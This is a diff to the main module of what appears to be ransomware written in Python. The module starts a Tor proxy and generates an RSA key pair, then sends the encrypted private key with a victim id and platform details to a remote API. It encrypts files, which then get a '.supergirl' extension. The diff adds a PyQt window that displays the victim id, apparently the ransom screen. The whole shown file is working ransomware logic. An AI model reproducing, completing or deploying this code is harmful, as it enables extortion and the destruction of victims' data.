@@ -1,8 +1,10 @@
 from cryptography.hazmat.primitives import serialization, hashes
 from cryptography.hazmat.primitives.asymmetric import padding
 from cryptography.hazmat.backends import default_backend
+from PyQt5.QtWidgets import QApplication
 from RSA.RSAKeyGen import RSAKeyGen
 import base64
+import sys
 import platform
 import uuid
 import Config
@@ -11,6 +13,7 @@ from pathlib import Path
 from Helper import Helper
 from FileCrypter import FileCrypter
 from TorManager import TorManager
+from GUI import GUI
 
 _helper = Helper()
 _session = 0
@@ -20,7 +23,10 @@ def init():
     tor = TorManager()
     tor.startProxy()
     _session = tor.getSession()
-    genKeyPair()
+    id = genKeyPair()
+    app = QApplication(sys.argv)
+    oMainwindow = GUI(id)
+    sys.exit(app.exec_())
 
 
 def genKeyPair():
@@ -29,8 +35,9 @@ def genKeyPair():
     cipher_cpriv_key = base64.b64encode(encryptClientPrivKey(keys.getPrivateKeyAsStr()))
     #send key and sys info to API
     os_info = platform.platform()
+    unique_id = str(uuid.uuid4())
     data = {
-        'hwid': str(uuid.uuid4()),
+        'hwid': unique_id,
         'priv_key': cipher_cpriv_key.decode('utf-8'),
         'platform': os_info
     }
@@ -49,11 +56,7 @@ def genKeyPair():
         except IOError:
             _helper.error("Could not encrypt " + path_in_str)
 
-    #fC = FileCrypter()
-    #fC.encrypt_file("info4.pdf", keys.getPublicKeyAsStr())
-    #time.sleep(40)
-    #fC.decrypt_file("info4.pdf.supergirl", clear_key.decode('utf-8'))
-
+    return unique_id
 
 
 def encryptClientPrivKey(priv_key):
